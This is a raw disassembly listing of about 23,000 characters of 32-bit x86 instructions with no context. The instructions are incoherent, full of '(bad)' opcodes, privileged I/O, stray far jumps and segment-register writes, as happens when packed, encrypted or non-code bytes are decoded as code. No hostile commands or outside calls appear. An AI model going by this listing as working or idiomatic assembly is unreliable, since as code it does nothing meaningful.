  416d42:	cmp    ah,BYTE PTR [eax+0x2e]
  416d45:	adc    eax,0xcc4c1635
  416d4a:	add    al,0x8e
  416d4c:	xchg   edi,eax
  416d4d:	aad    0x83
  416d4f:	std    
  416d50:	jle    0x416d4b
  416d52:	cdq    
  416d53:	mov    edi,0xc524b2f5
  416d58:	ds test dl,dh
  416d5b:	mov    bl,BYTE PTR [ecx-0x30d7f2de]
  416d61:	inc    esp
  416d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d63:	aad    0x95
  416d65:	call   esp
  416d67:	or     DWORD PTR [eax-0x47f413fd],edx
  416d6d:	jg     0x416da5
  416d6f:	jo     0x416ddc
  416d71:	fidiv  DWORD PTR [ebp+0x506cdbd4]
  416d77:	cmp    ebx,edi
  416d79:	jp     0x416da9
  416d7b:	and    al,0xa4
  416d7d:	mov    ds,WORD PTR [edx+0x2bad019a]
  416d83:	shl    edi,cl
  416d85:	dec    edi
  416d86:	in     eax,0x7
  416d88:	adc    al,0x75
  416d8a:	or     dl,BYTE PTR [edx]
  416d8c:	loope  0x416d9c
  416d8e:	sbb    dl,BYTE PTR ds:0xd36ec6cf
  416d94:	cs icebp 
  416d96:	xchg   edx,eax
  416d97:	push   ecx
  416d98:	mov    edi,DWORD PTR [esi-0x15a8d0ad]
  416d9e:	out    0xee,eax
  416da0:	test   BYTE PTR [ebp-0x603e253c],ah
  416da6:	(bad)  
  416da7:	pusha  
  416da8:	ins    DWORD PTR es:[edi],dx
  416da9:	mov    BYTE PTR [edi],cl
  416dab:	bound  ecx,QWORD PTR [edx-0x5]
  416dae:	sbb    al,0x51
  416db0:	retf   0x92c1
  416db3:	add    bh,bl
  416db5:	aas    
  416db6:	mov    eax,0xec0ac645
  416dbb:	mov    ds:0x30b37baf,eax
  416dc0:	xlat   BYTE PTR ds:[ebx]
  416dc1:	push   0x55c4a80e
  416dc6:	mov    dh,0x12
  416dc8:	sbb    bh,dl
  416dca:	aad    0x27
  416dcc:	xchg   esp,eax
  416dcd:	ret    0xbb72
  416dd0:	jmp    0x416db2
  416dd2:	pushf  
  416dd3:	in     al,0xbc
  416dd5:	adc    al,BYTE PTR [edx-0x1e]
  416dd8:	cmp    DWORD PTR [esi+esi*8-0x43],0xffffff82
  416ddd:	retf   
  416dde:	jo     0x416df3
  416de0:	push   edi
  416de1:	cwde   
  416de2:	mov    al,0x57
  416de4:	xor    ah,BYTE PTR [edx-0x4d]
  416de7:	jno    0x416e07
  416de9:	cld    
  416dea:	mov    al,ds:0x58bdd38f
  416def:	in     eax,0x23
  416df1:	dec    ebx
  416df2:	fdivr  st,st(4)
  416df4:	jo     0x416e66
  416df6:	shr    ebp,1
  416df8:	inc    edx
  416df9:	jae    0x416e04
  416dfb:	xor    esp,DWORD PTR [edx+0x512308f1]
  416e01:	mov    ebx,0x2094eeea
  416e06:	jbe    0x416d93
  416e08:	mov    cs,eax
  416e0a:	xchg   bh,dh
  416e0c:	mov    ah,0x44
  416e0e:	push   0x5aa6e6bb
  416e13:	jmp    0x416e88
  416e15:	sub    DWORD PTR [esi+0x5fca879e],eax
  416e1b:	div    DWORD PTR [ebp-0x6decfbd2]
  416e21:	jbe    0x416e28
  416e23:	push   ebx
  416e24:	inc    esi
  416e25:	add    DWORD PTR [eax],eax
  416e27:	or     ecx,DWORD PTR [ebx+eax*1-0x6d]
  416e2b:	push   eax
  416e2c:	push   ds
  416e2d:	(bad)  
  416e2f:	fld    DWORD PTR [esi-0x7174c2ea]
  416e35:	stos   BYTE PTR es:[edi],al
  416e36:	and    al,0x51
  416e38:	fimul  WORD PTR [edx-0x7a]
  416e3b:	or     eax,0x2b77a548
  416e40:	fwait
  416e41:	xchg   bh,cl
  416e43:	add    al,BYTE PTR [edi+eiz*4-0x29]
  416e47:	pop    es
  416e48:	cwde   
  416e49:	lods   eax,DWORD PTR ds:[esi]
  416e4a:	mov    DWORD PTR cs:[esi-0x51f7a0da],ebp
  416e51:	lods   al,BYTE PTR ds:[esi]
  416e52:	push   esp
  416e53:	push   ebx
  416e54:	jbe    0x416e2a
  416e56:	popf   
  416e57:	ss call 0xea78:0xc99a475d
  416e5f:	xchg   esi,eax
  416e60:	jbe    0x416e1c
  416e62:	mov    gs,WORD PTR [esi-0x31]
  416e65:	push   ss
  416e66:	xchg   ecx,eax
  416e67:	add    bh,BYTE PTR [eax+0x22]
  416e6a:	mov    dh,0x31
  416e6c:	push   esp
  416e6d:	push   ds
  416e6e:	xchg   edi,eax
  416e6f:	cmp    dh,BYTE PTR [esi]
  416e71:	pop    esi
  416e72:	(bad)
  416e76:	lahf   
  416e77:	jo     0x416ed3
  416e79:	inc    ebp
  416e7a:	xchg   esp,eax
  416e7b:	add    al,0xf
  416e7d:	rcl    ecx,1
  416e7f:	jp     0x416ecb
  416e81:	pop    ebx
  416e83:	xchg   ebp,eax
  416e84:	loopne 0x416e17
  416e86:	mov    bl,0x7d
  416e88:	jmp    0xa368551d
  416e8d:	xchg   DWORD PTR [ecx-0x63048d9],ebx
  416e93:	cmp    DWORD PTR [ebx],esp
  416e95:	add    ch,al
  416e97:	cmc    
  416e98:	sub    esi,esp
  416e9a:	adc    dl,BYTE PTR [edx+edx*2+0x1123ebec]
  416ea1:	sbb    al,0x25
  416ea3:	cmp    bl,ah
  416ea5:	push   0xffffffed
  416ea7:	gs dec eax
  416ea9:	adc    DWORD PTR [ebx+0x783a3385],ebx
  416eaf:	push   ss
  416eb0:	jg     0x416ebc
  416eb2:	mov    esi,0x6b904812
  416eb7:	pop    ss
  416eb8:	add    BYTE PTR [ebp+0x5e61be6],bl
  416ebe:	jno    0x416ea3
  416ec0:	mov    ds:0xc139265e,eax
  416ec5:	mov    dl,0x7e
  416ec7:	or     ebp,DWORD PTR [esi+ebp*4]
  416eca:	mov    ah,0x37
  416ecc:	shr    eax,1
  416ece:	test   al,0xba
  416ed0:	retf   
  416ed1:	push   ebx
  416ed2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ed3:	push   cs
  416ed4:	and    ebp,edi
  416ed6:	push   ebp
  416ed7:	sbb    cl,BYTE PTR [edi-0x1a]
  416eda:	xor    bh,cl
  416edc:	add    DWORD PTR [ebx],eax
  416ede:	or     al,0x33
  416ee0:	mov    BYTE PTR [edi+edi*4+0x80bf4f7],cl
  416ee7:	or     eax,0xdedea8a4
  416eec:	mov    ds:0xb2a37b79,al
  416ef1:	(bad)  
  416ef3:	inc    eax
  416ef4:	push   esi
  416ef5:	nop
  416ef6:	das    
  416ef7:	xchg   esi,eax
  416ef8:	xchg   edx,eax
  416ef9:	mul    ebx
  416efb:	arpl   WORD PTR [ebx+ebp*4-0x17],dx
  416eff:	arpl   di,ax
  416f01:	xor    al,0xdb
  416f03:	in     al,dx
  416f04:	sub    eax,0x52c5a9b2
  416f09:	push   es
  416f0a:	xchg   esi,eax
  416f0b:	int    0xde
  416f0d:	stos   BYTE PTR es:[edi],al
  416f0e:	ins    BYTE PTR es:[edi],dx
  416f0f:	add    DWORD PTR [eax],ebp
  416f11:	in     eax,dx
  416f12:	lods   eax,DWORD PTR ds:[esi]
  416f13:	in     al,dx
  416f14:	ins    DWORD PTR es:[edi],dx
  416f15:	std    
  416f16:	push   ebx
  416f17:	pusha  
  416f18:	fwait
  416f19:	push   ebp
  416f1a:	les    edi,FWORD PTR [edx]
  416f1c:	add    eax,0x388ab57
  416f21:	js     0x416fa1
  416f23:	pop    edx
  416f24:	shl    DWORD PTR [ecx+edi*2+0x6088083b],cl
  416f2b:	inc    ebx
  416f2c:	stos   BYTE PTR es:[edi],al
  416f2d:	aas    
  416f2e:	cmc    
  416f2f:	inc    edx
  416f30:	add    BYTE PTR [edi-0x68],0xdf
  416f34:	lahf   
  416f35:	sti    
  416f36:	imul   ebp,DWORD PTR [ebx+0xd],0x53
  416f3a:	xchg   ebx,eax
  416f3b:	add    edx,ebp
  416f3d:	ror    DWORD PTR [edx+0x4ceecfa8],0xc2
  416f44:	jnp    0x416f01
  416f46:	jns    0x416f24
  416f48:	push   esi
  416f49:	mov    dl,0x59
  416f4b:	jle    0x416f60
  416f4d:	in     al,0xdb
  416f4f:	sub    DWORD PTR [ecx+esi*4-0x25b60137],edx
  416f56:	cmp    ch,BYTE PTR ds:0xf4389eaa
  416f5c:	mov    eax,0x6c3a3638
  416f61:	inc    BYTE PTR [esi+0x4542e854]
  416f67:	pop    ds
  416f68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f69:	stos   BYTE PTR es:[edi],al
  416f6a:	mov    WORD PTR [edi],ds
  416f6c:	cmp    ecx,ebp
  416f6e:	lock pop eax
  416f70:	popf   
  416f71:	sub    al,0x5e
  416f73:	inc    ecx
  416f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f75:	ror    DWORD PTR [ebp+eiz*8+0x2f],0xf4
  416f7a:	aam    0x43
  416f7c:	icebp  
  416f7d:	add    DWORD PTR [esi-0x72],eax
  416f80:	stos   BYTE PTR es:[edi],al
  416f81:	jae    0x416fc3
  416f83:	movups xmm4,XMMWORD PTR [ebx]
  416f86:	popa   
  416f87:	dec    esp
  416f88:	cmp    bl,0x72
  416f8b:	out    0x5d,eax
  416f8d:	pop    ebp
  416f8e:	cli    
  416f8f:	ins    DWORD PTR es:[edi],dx
  416f90:	push   edx
  416f91:	mov    cl,BYTE PTR [ecx-0x1af85a6b]
  416f97:	aam    0xce
  416f99:	xor    BYTE PTR [ecx],dh
  416f9b:	sub    esp,edx
  416f9d:	and    edi,DWORD PTR [ecx*1-0x4a27a1df]
  416fa4:	retf   0x8c8b
  416fa7:	inc    ecx
  416fa8:	les    ebx,FWORD PTR [edi+0x3e133c26]
  416fae:	ret    
  416faf:	ror    BYTE PTR [ebx],cl
  416fb1:	and    bl,BYTE PTR [eax-0xdb8776]
  416fb7:	loop   0x416f4b
  416fb9:	out    dx,al
  416fba:	push   esp
  416fbb:	mov    edx,0x2f93afaf
  416fc0:	jne    0x416f6f
  416fc2:	inc    eax
  416fc3:	or     ebp,ebp
  416fc5:	and    DWORD PTR [edi+0x35bf493],0xe262ee61
  416fcf:	test   DWORD PTR [eax-0x50610b14],ebp
  416fd5:	inc    edi
  416fd6:	sub    eax,DWORD PTR ds:0xddde4405
  416fdc:	add    al,0xb7
  416fde:	mov    ebp,0x9deddcb3
  416fe3:	xchg   ebx,eax
  416fe4:	call   FWORD PTR [ebx]
  416fe6:	test   DWORD PTR [edi],edi
  416fe8:	mov    ah,0xe6
  416fea:	mov    al,BYTE PTR [ecx+0x4ccb0899]
  416ff0:	leave  
  416ff1:	add    esp,DWORD PTR [ebx+0x9]
  416ff4:	repz jb 0x416fdc
  416ff7:	xchg   ebx,eax
  416ff8:	xchg   ebx,eax
  416ff9:	mov    esi,0xdddb0a70
  416ffe:	sub    eax,DWORD PTR [edi]
  417000:	push   ss
  417001:	dec    ecx
  417002:	gs imul edx,ecx,0xb33952a7
  417009:	add    dh,BYTE PTR [edi-0x6f2c7262]
  41700f:	fucomp st(5)
  417011:	jo     0x417064
  417013:	pop    ebp
  417014:	or     DWORD PTR [ecx-0x8],0x80c7081b
  41701b:	xchg   BYTE PTR ds:0xdbe9fd5e,bl
  417021:	lds    esi,FWORD PTR [edi-0xdce795a]
  417027:	es xchg ebx,eax
  417029:	mov    ds:0x593d5432,eax
  41702e:	mov    edi,0x3f7e8200
  417033:	out    dx,al
  417034:	cs sub eax,0x4eddc5f
  41703a:	lds    ebx,FWORD PTR [ebx+0xc142543]
  417040:	jns    0x417090
  417042:	lods   eax,DWORD PTR ds:[esi]
  417043:	fisub  DWORD PTR [edx+ebp*1+0x6b]
  417047:	cwde   
  417048:	enter  0xe645,0x99
  41704c:	xchg   BYTE PTR [ebx],dh
  41704e:	push   ds
  41704f:	mov    bl,ch
  417051:	push   ds
  417052:	bound  eax,QWORD PTR [edi+0x13]
  417055:	or     DWORD PTR [eax+edx*8],ebx
  417058:	aas    
  417059:	jmp    0x1398:0x9f63d0d
  417060:	pusha  
  417061:	inc    ebp
  417062:	mov    edx,0x2bd9867b
  417067:	in     al,0x8d
  417069:	std    
  41706a:	cdq    
  41706b:	dec    esp
  41706c:	xchg   esi,eax
  41706d:	outs   dx,DWORD PTR ds:[esi]
  41706e:	lods   al,BYTE PTR ds:[esi]
  41706f:	leave  
  417070:	dec    esp
  417071:	jl     0x41705b
  417073:	test   DWORD PTR [esi],eax
  417075:	fcomip st,st(6)
  417077:	out    0xea,eax
  417079:	adc    BYTE PTR gs:[esi-0x444a1917],ch
  417080:	mov    esp,0x244ea16d
  417085:	inc    edi
  417086:	outs   dx,BYTE PTR ds:[esi]
  417087:	xor    al,0x6a
  417089:	jne    0x41708b
  41708b:	add    BYTE PTR ds:0xb6350aab,cl
  417091:	mov    edx,0x8165368c
  417096:	and    al,BYTE PTR [esi+0x2c213b0c]
  41709c:	inc    esi
  41709d:	xchg   esp,eax
  41709e:	test   al,0x5a
  4170a0:	jb     0x4170e4
  4170a2:	iret   
  4170a3:	push   ebx
  4170a4:	push   ss
  4170a5:	jne    0x417075
  4170a7:	xchg   edx,eax
  4170a8:	inc    eax
  4170a9:	ret    0xa3c
  4170ac:	sub    eax,0xa3281edf
  4170b1:	and    DWORD PTR [ecx-0x54e12f99],esi
  4170b7:	or     bl,ch
  4170b9:	nop
  4170ba:	dec    ecx
  4170bb:	repz add bl,BYTE PTR [ecx+0x5bf4bdfb]
  4170c2:	scas   eax,DWORD PTR es:[edi]
  4170c3:	pop    esp
  4170c4:	leave  
  4170c5:	sub    ch,BYTE PTR [ebx-0x6f]
  4170c8:	fisttp DWORD PTR [ecx]
  4170ca:	std    
  4170cb:	xchg   ebx,eax
  4170cc:	scas   al,BYTE PTR es:[edi]
  4170cd:	adc    DWORD PTR [edi],edx
  4170cf:	cdq    
  4170d0:	sub    ch,BYTE PTR [esi+0x4470fdce]
  4170d6:	call   0xb18b:0x178fef63
  4170dd:	test   eax,0x1ee92fc
  4170e2:	inc    esi
  4170e3:	loop   0x4170a5
  4170e5:	cmp    BYTE PTR [edx+esi*1+0x16],0xca
  4170ea:	push   edi
  4170eb:	cli    
  4170ec:	xchg   ebx,eax
  4170ed:	xchg   ebx,eax
  4170ee:	sbb    ah,BYTE PTR [edi-0x7f]
  4170f1:	jo     0x417096
  4170f3:	int    0x24
  4170f5:	(bad)  
  4170f6:	push   eax
  4170f7:	call   DWORD PTR [eax+esi*2-0x37]
  4170fb:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170fd:	cdq    
  4170fe:	xchg   BYTE PTR [esi+edi*2-0xafdd289],al
  417105:	jne    0x4170ad
  417107:	fist   WORD PTR [ebx-0x3be7eab5]
  41710d:	inc    ebp
  41710e:	mov    ebx,0x4f49d501
  417113:	stc    
  417114:	mov    eax,ds:0x4bebbea8
  417119:	pop    ss
  41711a:	mov    cl,0xc0
  41711c:	fist   DWORD PTR [edi+0x533fb8db]
  417122:	(bad)  
  417123:	pop    ecx
  417124:	lods   al,BYTE PTR gs:[esi]
  417126:	xor    DWORD PTR [ebp-0x28],eax
  417129:	mov    ch,0xbc
  41712b:	loopne 0x41716b
  41712d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41712e:	mov    ebx,0x7669b8bb
  417133:	icebp  
  417134:	rol    BYTE PTR [edi-0x5379b411],0x8a
  41713b:	aam    0x3d
  41713d:	outs   dx,BYTE PTR ds:[esi]
  41713e:	adc    bh,bl
  417140:	add    ecx,esi
  417142:	or     BYTE PTR [eax-0x6772554c],0xb3
  417149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41714a:	sbb    BYTE PTR [edi*4-0xc5622e8],0xd2
  417152:	or     eax,0xf5904cb4
  417157:	push   ecx
  417158:	and    esp,DWORD PTR [esi-0xa]
  41715b:	mov    ds:0x35127394,eax
  417160:	in     al,dx
  417161:	push   ss
  417162:	out    dx,al
  417163:	jmp    0x235:0x602213fd
  41716a:	or     eax,0xacec9eec
  41716f:	pop    esi
  417171:	or     BYTE PTR [ecx+ebx*2-0x5a],0x34
  417176:	cmp    eax,0xbc9f726
  41717b:	dec    ebx
  41717c:	push   0xa1865f45
  417181:	(bad)  
  417182:	jmp    0x72be3bdb
  417187:	or     BYTE PTR [eax],bh
  417189:	not    BYTE PTR [ebp-0x3e039d9b]
  41718f:	lods   eax,DWORD PTR ds:[esi]
  417190:	jno    0x4171d9
  417192:	cld    
  417193:	imul   ebx,DWORD PTR [edi-0x16],0xf733b22c
  41719a:	lea    ebp,ds:0x7878b7a0
  4171a0:	cwde   
  4171a1:	push   0x8f59c8a1
  4171a6:	pusha  
  4171a7:	xor    eax,0xbde5e4a
  4171ac:	jmp    0x417211
  4171ae:	ins    BYTE PTR es:[edi],dx
  4171af:	xchg   esi,eax
  4171b0:	lods   eax,DWORD PTR ds:[esi]
  4171b1:	jns    0x41714f
  4171b3:	(bad)  
  4171b4:	das    
  4171b5:	inc    edi
  4171b6:	stc    
  4171b7:	mov    eax,ds:0x6016d306
  4171bc:	out    0x6b,al
  4171be:	out    0xf2,eax
  4171c0:	iret   
  4171c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171c2:	pushf  
  4171c3:	iret   
  4171c4:	fs mov dh,0x8d
  4171c7:	mov    ds:0x75731f4e,eax
  4171cc:	test   BYTE PTR [eax],0x4f
  4171cf:	mov    WORD PTR [esi],?
  4171d1:	jecxz  0x41723b
  4171d3:	aam    0x80
  4171d5:	inc    eax
  4171d6:	gs add ecx,ebp
  4171d9:	push   ebp
  4171da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171db:	mov    es,WORD PTR [esi]
  4171dd:	(bad)  
  4171de:	cmp    ch,BYTE PTR [ecx+0xb27c62c]
  4171e4:	and    BYTE PTR [eax],bl
  4171e6:	lods   al,BYTE PTR ds:[esi]
  4171e7:	clc    
  4171e8:	lods   al,BYTE PTR ds:[esi]
  4171e9:	jmp    0x41724f
  4171eb:	mov    al,0x87
  4171ed:	xchg   edx,eax
  4171ee:	push   esi
  4171ef:	shl    eax,1
  4171f1:	(bad)  
  4171f3:	jns    0x4171d3
  4171f5:	test   DWORD PTR es:0xd6c99f4b,eax
  4171fc:	push   edx
  4171fd:	repnz push ds
  4171ff:	adc    BYTE PTR [esi+0x43],al
  417202:	push   ds
  417203:	push   0xfffffffe
  417205:	push   ds
  417206:	sub    BYTE PTR [eax],0x71
  417209:	mov    gs,WORD PTR [eax]
  41720b:	push   es
  41720c:	mov    ch,0x9c
  41720e:	stc    
  41720f:	mov    ds,WORD PTR [eax+ebx*4+0x1d]
  417213:	mov    BYTE PTR [ebx],0x92
  417216:	mov    edx,ecx
  417218:	inc    ebp
  417219:	dec    esp
  41721a:	test   eax,0x4e652d8a
  41721f:	jge    0x41720f
  417221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417222:	cmp    DWORD PTR [eax],0xb22a3a34
  417228:	sti    
  417229:	pusha  
  41722a:	(bad)  
  41722d:	push   0x7e4399dd
  417232:	retf   
  417233:	dec    edi
  417234:	and    DWORD PTR [edi+0x11],edi
  417237:	mov    esi,0xcfebeeab
  41723c:	inc    ecx
  41723d:	inc    ebp
  41723e:	loope  0x4171e2
  417240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417241:	rcl    BYTE PTR [edx],0x84
  417244:	adc    al,BYTE PTR [ebp+0x1a]
  417247:	aaa    
  417248:	in     al,0xcf
  41724a:	aad    0xd1
  41724c:	cwde   
  41724d:	aam    0xd6
  41724f:	(bad)  
  417250:	cmp    eax,0x6dbd34f6
  417255:	jp     0x41720d
  417257:	mov    edx,DWORD PTR [eax+0x6199980c]
  41725d:	jae    0x41722c
  41725f:	leave  
  417260:	pop    ebx
  417261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417262:	adc    BYTE PTR [eax+0x120f75ee],ah
  417268:	jmp    FWORD PTR [esi+0x39]
  41726b:	mov    ebx,0x71e388f1
  417270:	iret   
  417271:	jmp    0xb0ce:0x96dd3db7
  417278:	repnz aad 0x3e
  41727b:	loopne 0x41725a
  41727d:	iret   
  41727e:	jns    0x417241
  417280:	push   ds
  417281:	into   
  417282:	ins    BYTE PTR es:[edi],dx
  417283:	mov    ah,0xd5
  417285:	jb     0x417259
  417287:	or     eax,0x59d10abc
  41728c:	(bad)  
  41728d:	jmp    0xb9ec4005
  417292:	fisub  WORD PTR [ebx+0x6181fae8]
  417298:	xor    ebx,DWORD PTR [ebp-0x3f]
  41729b:	rcr    eax,1
  41729d:	push   edx
  41729e:	or     eax,ebp
  4172a0:	shl    eax,1
  4172a2:	(bad)  
  4172a3:	sti    
  4172a4:	ret    0xc2db
  4172a7:	pop    ds
  4172a8:	mov    esi,0xc774ba5c
  4172ad:	sub    eax,0xa6ddc18a
  4172b2:	sbb    eax,0x4ea293ea
  4172b7:	dec    edi
  4172b8:	cmp    ebx,edx
  4172ba:	je     0x417293
  4172bc:	dec    edi
  4172bd:	push   esi
  4172be:	and    eax,0x2e0c4b9c
  4172c3:	or     DWORD PTR [eax],eax
  4172c5:	cwde   
  4172c6:	stc    
  4172c7:	mov    ebx,0xad9136a1
  4172cc:	fild   DWORD PTR [eax]
  4172ce:	push   DWORD PTR ds:0xc766c07d
  4172d4:	and    DWORD PTR [ebx+0x4351d3ee],esi
  4172da:	addr16 lahf 
  4172dc:	(bad)  
  4172dd:	sbb    ebp,DWORD PTR [edi]
  4172df:	dec    ebx
  4172e0:	push   0x72
  4172e2:	aaa    
  4172e3:	jo     0x417297
  4172e5:	mov    bh,BYTE PTR [edi+0x78c05ea6]
  4172eb:	push   eax
  4172ec:	ins    BYTE PTR es:[edi],dx
  4172ed:	push   ss
  4172ee:	xchg   esi,eax
  4172ef:	push   ecx
  4172f0:	lods   al,BYTE PTR ds:[esi]
  4172f1:	in     eax,0x9e
  4172f3:	push   ss
  4172f4:	inc    eax
  4172f5:	adc    eax,0xf1220e74
  4172fa:	inc    ecx
  4172fb:	push   ss
  4172fc:	(bad)  
  4172fe:	jne    0x4172a2
  417300:	jmp    0xde11:0x8ec337a2
  417307:	pop    edi
  417308:	test   BYTE PTR [ecx-0x44],ch
  41730b:	nop
  41730c:	iret   
  41730d:	inc    esi
  41730e:	inc    ebx
  41730f:	btc    DWORD PTR [esi+0x72],esp
  417313:	push   0x30
  417315:	sub    ebp,0x6
  417318:	push   ecx
  417319:	not    BYTE PTR [ecx-0x30]
  41731c:	sub    dh,BYTE PTR [ecx]
  41731e:	sub    DWORD PTR [ebp-0x59],esp
  417321:	mov    esp,0xeaa6214a
  417326:	xchg   edi,eax
  417327:	lods   eax,DWORD PTR ds:[esi]
  417328:	fcomp  QWORD PTR [eax+0x4b]
  41732b:	hlt    
  41732c:	test   eax,0x8e7814b6
  417331:	mov    ebx,0xc38de3c2
  417336:	pop    ss
  417337:	lahf   
  417338:	and    bl,ah
  41733a:	jge    0x4172f6
  41733c:	aas    
  41733d:	jo     0x417318
  41733f:	cdq    
  417340:	(bad)  
  417341:	retf   
  417342:	push   eax
  417343:	pusha  
  417344:	mov    esi,0x4eed795e
  417349:	sbb    esp,DWORD PTR [edi]
  41734b:	mov    ds:0x20d75ad0,eax
  417350:	das    
  417351:	js     0x41738a
  417353:	hlt    
  417354:	dec    eax
  417355:	xchg   BYTE PTR [ecx-0x3bed929e],ah
  41735b:	push   esi
  41735c:	mov    dl,0x38
  41735e:	cmc    
  41735f:	retf   
  417360:	push   ebp
  417361:	add    al,0x77
  417363:	mov    ch,0x1b
  417365:	fild   DWORD PTR [eax-0x4a]
  417368:	pop    esi
  417369:	daa    
  41736a:	xor    eax,0x68d03886
  41736f:	fdivr  QWORD PTR [edi+0x9]
  417372:	imul   esp,DWORD PTR [ecx],0xb273b79c
  417378:	nop
  417379:	dec    ebp
  41737a:	cli    
  41737b:	or     ebp,0x4c74245d
  417381:	xor    ebp,esp
  417383:	mov    cl,0x81
  417385:	mov    dl,0x8d
  417387:	cmc    
  417388:	mov    bh,0x43
  41738a:	cmp    ebx,edi
  41738c:	jae    0x4173ad
  41738e:	jle    0x417321
  417390:	jns    0x4173af
  417392:	mov    dh,0xac
  417394:	and    bh,ah
  417396:	add    BYTE PTR [eax],dh
  417398:	push   eax
  417399:	imul   edx,DWORD PTR [edi-0x7288b500],0x4193975e
  4173a3:	dec    edx
  4173a4:	daa    
  4173a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173a6:	into   
  4173a7:	aad    0x4e
  4173a9:	mov    edi,0xf1a0ca54
  4173ae:	add    ebx,DWORD PTR [eax-0x6ceb2684]
  4173b4:	test   DWORD PTR [ebp+edi*8-0x3a],esi
  4173b8:	sbb    bh,BYTE PTR [edi]
  4173ba:	cmp    DWORD PTR [ecx+0x68a0e3a4],esi
  4173c0:	ja     0x4173fa
  4173c2:	test   bl,bl
  4173c4:	pop    edi
  4173c5:	or     ebp,DWORD PTR [eax-0x58bbb396]
  4173cb:	sub    al,0x6d
  4173cd:	mov    al,0x82
  4173cf:	inc    edi
  4173d0:	dec    eax
  4173d1:	loopne 0x4173da
  4173d3:	aas    
  4173d4:	dec    eax
  4173d5:	in     eax,dx
  4173d6:	mov    esp,0x48b5c45e
  4173db:	inc    ecx
  4173dc:	cwde   
  4173dd:	cmp    eax,0x5c713108
  4173e2:	pusha  
  4173e3:	shr    BYTE PTR [ebp-0x704aeaa0],0x12
  4173ea:	mov    esi,gs
  4173ec:	daa    
  4173ed:	sar    DWORD PTR [ebx],0xd9
  4173f0:	mov    dh,0xa9
  4173f2:	mov    ds:0x98e05c04,eax
  4173f7:	retf   
  4173f8:	mov    edx,0x41d5861d
  4173fd:	sbb    al,0x7f
  4173ff:	cmp    edi,DWORD PTR [ebp+0x2d]
  417402:	lds    ecx,FWORD PTR [edx-0x7ddee0bf]
  417408:	and    ah,bh
  41740a:	lds    ebp,FWORD PTR [edi-0x23]
  41740d:	out    0x18,al
  41740f:	in     eax,0x1f
  417411:	les    esi,FWORD PTR [edi+esi*8+0x23062c1a]
  417418:	xor    BYTE PTR [esi-0x619c5610],dl
  41741e:	or     DWORD PTR [esi+0x2ee69460],0x12
  417425:	xor    BYTE PTR [edi],ah
  417427:	outs   dx,DWORD PTR ds:[esi]
  417428:	clc    
  417429:	xchg   ecx,eax
  41742a:	imul   esp,edx,0x1f
  41742d:	jg     0x4174a8
  41742f:	mov    DWORD PTR [esi-0x11a34f9a],edi
  417435:	sbb    dh,al
  417437:	xchg   si,ax
  417439:	retf   
  41743a:	(bad)  
  41743b:	shl    BYTE PTR [ebp+0x71],cl
  41743e:	(bad)  
  41743f:	test   al,0x55
  417441:	and    eax,DWORD PTR [ebp-0x30]
  417444:	imul   ebp,DWORD PTR [esi+0x2],0xa6ba07
  41744b:	pop    ebx
  41744c:	rcr    DWORD PTR [edx+0x42],1
  41744f:	push   0x51
  417451:	mov    eax,0xfcee8214
  417456:	adc    DWORD PTR [edi],eax
  417458:	pusha  
  417459:	mov    ecx,0x509534dd
  41745e:	dec    eax
  41745f:	push   ebp
  417460:	fsub   st(4),st
  417462:	push   ds
  417463:	add    al,bh
  417465:	shl    BYTE PTR [edx-0x240a7528],1
  41746b:	es (bad) 
  41746e:	and    BYTE PTR [edi+esi*4],bl
  417471:	pop    ss
  417472:	pop    DWORD PTR [edx-0x3e]
  417475:	into   
  417476:	lock dec ebx
  417478:	push   eax
  417479:	in     al,dx
  41747a:	dec    ebx
  41747b:	xchg   ebx,eax
  41747c:	test   DWORD PTR [esi],esi
  41747e:	das    
  41747f:	adc    ebx,DWORD PTR [edi+0x7ba9b690]
  417485:	enter  0x9d82,0x34
  417489:	jmp    0x1443:0x7b3b0304
  417490:	and    ebx,DWORD PTR [edx-0x11]
  417493:	inc    esi
  417494:	into   
  417495:	sti    
  417496:	mov    esp,0xad38e856
  41749b:	or     ch,BYTE PTR [ecx-0x5d7f1da9]
  4174a1:	outs   dx,BYTE PTR ds:[esi]
  4174a2:	add    cl,bh
  4174a4:	fdiv   QWORD PTR [esi-0x2562e685]
  4174aa:	push   esi
  4174ab:	xchg   ecx,eax
  4174ac:	imul   esp,DWORD PTR [edi+0xf0f9ba4],0xdd1e1843
  4174b6:	inc    ebp
  4174b7:	in     eax,dx
  4174b8:	mov    ds:0xad203583,al
  4174bd:	retf   
  4174be:	pop    ebx
  4174bf:	shl    BYTE PTR [ebx+0x6a55b692],0x97
  4174c6:	mov    esp,0x2704494a
  4174cb:	pop    eax
  4174cc:	fs aas 
  4174ce:	(bad)  [ebx]
  4174d0:	sbb    DWORD PTR [eax+0x54f83bfa],ecx
  4174d6:	fldenv [ebp-0x1db88d00]
  4174dc:	sbb    BYTE PTR ds:0xee5ca074,ch
  4174e2:	ss int 0xa9
  4174e5:	push   ds
  4174e6:	sub    DWORD PTR [ecx+0x79],edi
  4174e9:	xchg   ebp,eax
  4174ea:	stos   DWORD PTR es:[edi],eax
  4174eb:	push   ebp
  4174ec:	sub    dl,BYTE PTR [edi+0x25903bd8]
  4174f2:	or     ch,dl
  4174f4:	gs sbb eax,0x745e92f2
  4174fa:	loop   0x4174c0
  4174fc:	ins    BYTE PTR es:[edi],dx
  4174fd:	pop    ebx
  4174fe:	jmp    0x8fa:0x40d213f
  417505:	aam    0x82
  417507:	xor    eax,DWORD PTR [ebx+0x60]
  41750a:	inc    ebp
  41750b:	ins    BYTE PTR es:[edi],dx
  41750c:	jmp    0xbd333e2c
  417511:	push   edx
  417512:	out    dx,al
  417513:	sahf   
  417514:	scas   al,BYTE PTR es:[edi]
  417515:	jmp    0xe11e2856
  41751a:	imul   ebp,eax,0xdf9cfd1d
  417520:	sub    esi,ebp
